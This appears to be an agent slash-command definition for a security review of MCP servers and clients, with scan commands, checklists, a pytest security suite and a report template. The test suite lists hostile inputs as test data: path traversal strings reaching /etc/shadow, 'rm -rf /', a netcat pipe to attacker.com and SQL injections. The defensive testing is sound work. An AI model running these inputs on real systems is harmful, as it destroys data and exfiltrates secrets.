---
description: Security review of MCP server or client
argument-hint: Path to MCP project for security review
---

# Security Review of MCP Implementation

Perform comprehensive security review of an MCP server or client implementation.

## Usage

```
/review-mcp-security [project-path]
```

**Arguments:**
- `project-path`: Path to MCP project directory (optional, defaults to current directory)

**Examples:**
```
/review-mcp-security
/review-mcp-security ./my-mcp-server
/review-mcp-security ../production-mcp-client
```

## What This Command Does

This command performs a thorough security review of an MCP implementation, checking for:
- Input validation vulnerabilities
- Path traversal issues
- Command/SQL injection risks
- API key exposure
- Information disclosure
- Dependency vulnerabilities
- Rate limiting issues
- Transport security

## Workflow Steps

### Step 1: Detect Project Details

Analyze the project to gather information:
1. **Type**: Server or Client?
2. **Language**: Python or TypeScript?
3. **External Integrations**: APIs, databases, filesystems?
4. **Authentication**: How are credentials managed?
5. **Transport**: stdio, SSE, or both?

### Step 2: Launch Security Reviewer Agent

Use the Task tool to launch `mcp-security-reviewer` agent.

**Agent Task:**
```
Perform comprehensive security review of MCP [server/client]:

Project: [project name]
Location: [project path]
Language: [Python/TypeScript]
Type: [Server/Client]

Review Areas:
1. Input Validation
   - Tool parameter validation
   - Resource URI parsing
   - File path handling
   - SQL query construction (if applicable)
   - Command execution parameters

2. Authentication & Authorization
   - API key management
   - Token storage and handling
   - Permission checking
   - Rate limiting

3. Data Access Controls
   - File system access restrictions
   - Database query permissions
   - API endpoint access
   - Resource whitelisting

4. Information Disclosure
   - Error messages
   - Log output
   - Stack traces
   - Debug information

5. Dependency Security
   - Known vulnerabilities
   - Outdated packages
   - Malicious packages

6. Transport Security (if SSE)
   - HTTPS usage
   - Certificate validation
   - Man-in-the-middle protection

Deliverables:
- Complete security review report
- Vulnerability list with severity (Critical/High/Medium/Low)
- Specific code locations
- Remediation recommendations with code examples
- Security checklist results
```

### Step 3: Run Automated Security Scans

**Python Security Scanning:**

```bash
# Install security tools
pip install bandit safety pip-audit

# Bandit - code security scanner
bandit -r src/ -f json -o bandit-report.json

# Safety - dependency vulnerability checker
safety check --json > safety-report.json

# pip-audit - check for vulnerable dependencies
pip-audit --format json > pip-audit-report.json
```

**TypeScript Security Scanning:**

```bash
# npm audit - check for vulnerable dependencies
npm audit --json > npm-audit-report.json

# Snyk - comprehensive security scanning
npm install -g snyk
snyk auth
snyk test --json > snyk-report.json

# ESLint with security plugin
npm install -g eslint eslint-plugin-security
eslint --ext .ts src/ --format json > eslint-security-report.json
```

### Step 4: Manual Code Review

Review critical security-sensitive code areas:

**For Servers:**

1. **Tool Input Validation:**
```python
# Check each tool for proper validation
@mcp.tool()
def read_file(path: str) -> dict:
    # LOOK FOR:
    # - Path sanitization
    # - Base directory restriction
    # - Input length limits
    # - Character whitelisting
```

2. **Command Execution:**
```python
# Check for shell=True usage (DANGEROUS)
subprocess.run(command, shell=True)  # ❌ VULNERABLE

# Should use array and shell=False
subprocess.run([cmd, arg1, arg2], shell=False)  # ✓ SAFE
```

3. **SQL Queries:**
```python
# Check for string concatenation (VULNERABLE)
query = f"SELECT * FROM users WHERE id = {user_id}"  # ❌

# Should use parameterized queries
query = "SELECT * FROM users WHERE id = ?"  # ✓
db.execute(query, (user_id,))
```

4. **API Key Management:**
```python
# Check for hardcoded secrets (VULNERABLE)
API_KEY = "sk-1234567890"  # ❌

# Should use environment variables
API_KEY = os.getenv("API_KEY")  # ✓
```

**For Clients:**

1. **Server Connection Validation:**
2. **Tool Parameter Sanitization:**
3. **Resource URI Validation:**
4. **Credential Storage:**

### Step 5: Check Security Best Practices

Verify implementation of security best practices:

**Input Validation Checklist:**
- [ ] All tool parameters validated
- [ ] Type checking enforced (Pydantic/Zod)
- [ ] Input length limits set
- [ ] Character whitelisting for sensitive inputs
- [ ] Regex patterns validated

**File System Security:**
- [ ] Base directory restrictions enforced
- [ ] Path traversal prevention implemented
- [ ] Symlink attack prevention
- [ ] File type validation
- [ ] Size limits enforced

**Command Execution Security:**
- [ ] shell=False always used
- [ ] Command whitelist implemented
- [ ] Argument sanitization
- [ ] Timeout limits set

**Database Security:**
- [ ] Parameterized queries only
- [ ] Read-only connections where possible
- [ ] Query timeout limits
- [ ] Connection pooling secure

**API Security:**
- [ ] Credentials in environment variables
- [ ] No secrets in logs
- [ ] HTTPS only for external APIs
- [ ] Certificate validation enabled
- [ ] Timeout limits set

**Error Handling:**
- [ ] No stack traces to users
- [ ] Generic error messages
- [ ] Detailed errors logged securely
- [ ] Error correlation IDs

**Rate Limiting:**
- [ ] Per-tool rate limits
- [ ] Per-user rate limits (if applicable)
- [ ] Global rate limits
- [ ] Backoff strategies

**Logging:**
- [ ] No credentials logged
- [ ] Sensitive data redacted
- [ ] Security events logged
- [ ] Log rotation configured

### Step 6: Dependency Vulnerability Assessment

Analyze all dependencies for known vulnerabilities:

**Python:**
```bash
# Check all dependencies
safety check --full-report

# Check specific package
pip show package-name
```

**TypeScript:**
```bash
# Check all dependencies
npm audit

# Fix automatically where possible
npm audit fix

# Check for major updates
npm outdated
```

**Create Dependency Report:**

| Package | Current | Vulnerability | Severity | Fixed In | Action |
|---------|---------|---------------|----------|----------|--------|
| requests | 2.25.0 | CVE-2023-xxxxx | High | 2.31.0 | Update |
| axios | 0.21.1 | CVE-2021-3749 | Critical | 0.21.2 | Update |

### Step 7: Test Security Scenarios

Run security-specific tests:

```python
import pytest

class TestSecurityScenarios:
    """Security-focused test cases"""

    def test_path_traversal_prevention(self):
        """Attempt path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]

        for path in malicious_paths:
            result = mcp.call_tool("read_file", {"path": path})
            assert result["success"] is False
            assert "access denied" in result["error"].lower()

    def test_command_injection_prevention(self):
        """Attempt command injection"""
        malicious_commands = [
            "ls; rm -rf /",
            "ls && cat /etc/passwd",
            "ls | nc attacker.com 4444"
        ]

        for cmd in malicious_commands:
            result = mcp.call_tool("run", {"command": cmd})
            assert result["success"] is False

    def test_sql_injection_prevention(self):
        """Attempt SQL injection"""
        malicious_inputs = [
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin' UNION SELECT password FROM users--"
        ]

        for username in malicious_inputs:
            result = mcp.call_tool("search_user", {"username": username})
            # Should not return unauthorized data
            assert result.get("users", []) == []

    def test_no_secrets_in_errors(self):
        """Ensure secrets not exposed in errors"""
        result = mcp.call_tool("api_call_with_token", {"endpoint": "/invalid"})

        # Check error doesn't contain API key
        error_str = str(result).lower()
        assert "api_key" not in error_str
        assert "token" not in error_str
        assert "secret" not in error_str

    def test_rate_limiting(self):
        """Verify rate limiting works"""
        # Make many requests rapidly
        results = []
        for i in range(150):
            result = mcp.call_tool("expensive_operation", {})
            results.append(result)

        # Some requests should be rate limited
        rate_limited = [r for r in results if "rate limit" in r.get("error", "").lower()]
        assert len(rate_limited) > 0
```

### Step 8: Generate Security Report

Create comprehensive security report:

```markdown
# Security Review Report

**Project**: [project name]
**Version**: [version]
**Review Date**: [date]
**Reviewer**: Security Review Agent

## Executive Summary

[Brief overview of security posture]

**Overall Risk Level**: [Low/Medium/High/Critical]

**Summary**:
- Critical Issues: [count]
- High Severity: [count]
- Medium Severity: [count]
- Low Severity: [count]
- Informational: [count]

## Critical Vulnerabilities (Fix Immediately)

### 1. Path Traversal in read_file Tool

**Severity**: Critical
**CWE**: CWE-22 (Path Traversal)
**Location**: `src/tools/filesystem.py:45`

**Description**:
The `read_file` tool does not validate file paths, allowing attackers to read arbitrary files on the system.

**Vulnerable Code**:
```python
@mcp.tool()
def read_file(path: str) -> dict:
    with open(path, 'r') as f:
        return {"content": f.read()}
```

**Proof of Concept**:
```
read_file(path="../../../etc/passwd")
```

**Impact**:
Attackers can read sensitive files including:
- /etc/passwd, /etc/shadow
- SSH keys
- Application secrets
- Database credentials

**Remediation**:
```python
from pathlib import Path

BASE_DIR = Path("/safe/data/directory").resolve()

@mcp.tool()
def read_file(path: str) -> dict:
    try:
        # Resolve and validate path
        file_path = (BASE_DIR / path).resolve()
        file_path.relative_to(BASE_DIR)  # Raises ValueError if outside BASE_DIR

        with open(file_path, 'r') as f:
            return {"success": True, "content": f.read()}

    except ValueError:
        return {"success": False, "error": "Access denied"}
    except Exception as e:
        return {"success": False, "error": "Read failed"}
```

[Continue for all critical issues...]

## High Severity Issues

[List all high severity issues with similar format]

## Medium Severity Issues

[List all medium severity issues]

## Low Severity Issues

[List all low severity issues]

## Dependency Vulnerabilities

| Package | Version | Vulnerability | Severity | Fixed Version |
|---------|---------|---------------|----------|---------------|
| [package] | [current] | [CVE-ID] | [severity] | [fixed] |

## Security Checklist

### Input Validation
- [ ] Tool parameters validated ❌
- [ ] Type checking enforced ✓
- [ ] Length limits set ✓
- [ ] Character whitelisting ❌

### Authentication & Authorization
- [ ] API keys in environment ❌ (hardcoded in config.py)
- [ ] No secrets in code ❌
- [ ] Rate limiting implemented ✓
- [ ] Token validation ✓

### Data Access
- [ ] File system restricted ❌ (CRITICAL)
- [ ] SQL injection prevented ✓
- [ ] Command injection prevented ❌ (HIGH)

### Error Handling
- [ ] No stack traces exposed ✓
- [ ] Generic error messages ✓
- [ ] Secrets not in logs ⚠️ (needs verification)

## Recommendations

### Immediate Actions (Within 1 Week)
1. **Fix path traversal** in read_file tool
2. **Remove hardcoded API keys** - move to environment variables
3. **Fix command injection** in run_command tool
4. **Update vulnerable dependencies**:
   - requests: 2.25.0 → 2.31.0
   - axios: 0.21.1 → 1.6.0

### Short Term (Within 1 Month)
1. Implement comprehensive input validation for all tools
2. Add rate limiting to all expensive operations
3. Implement security logging for audit trail
4. Add automated security scanning to CI/CD

### Long Term
1. Regular security audits (quarterly)
2. Automated dependency updates
3. Security training for development team
4. Penetration testing

## Testing Recommendations

Add these security tests:
```python
# tests/security/test_security.py
def test_path_traversal():
    """Verify path traversal prevention"""

def test_command_injection():
    """Verify command injection prevention"""

def test_no_hardcoded_secrets():
    """Scan codebase for hardcoded secrets"""
```

## Compliance

- [ ] OWASP Top 10 addressed
- [ ] CWE Top 25 reviewed
- [ ] Secure coding practices followed
- [ ] Security documentation present

## Conclusion

[Overall assessment and required actions]

**Next Review**: [recommended date]
```

### Step 9: Provide Remediation Guidance

For each vulnerability, provide:
1. **Detailed explanation** of the issue
2. **Severity rating** with justification
3. **Working code example** showing the fix
4. **Testing recommendations**
5. **Additional resources**

### Step 10: Generate Summary

```
✓ Security Review Complete: [project-name]

Security Assessment:
  Overall Risk: HIGH ⚠️
  Critical Issues: 2
  High Severity: 3
  Medium Severity: 5
  Low Severity: 8

Top Issues to Fix:
  1. [CRITICAL] Path traversal in read_file tool
  2. [CRITICAL] Hardcoded API keys in config.py
  3. [HIGH] Command injection in run_command
  4. [HIGH] SQL injection in search_users
  5. [HIGH] Information disclosure in error messages

Dependency Issues:
  - 3 packages with known vulnerabilities
  - 2 packages severely outdated

Recommendations:
  ⚠️  Fix critical issues immediately before deployment
  ⚠️  Update all vulnerable dependencies
  ✓  Add security tests to test suite
  ✓  Implement automated security scanning in CI/CD

Detailed report: ./security-report.md
Scan results: ./security-scans/
```

## Success Criteria

- [ ] Security review agent completed analysis
- [ ] Automated security scans run
- [ ] Manual code review performed
- [ ] Security test cases created
- [ ] Vulnerabilities documented with severity
- [ ] Remediation guidance provided
- [ ] Security report generated
- [ ] Dependencies checked for vulnerabilities

This command ensures MCP implementations follow security best practices and are safe for production use.
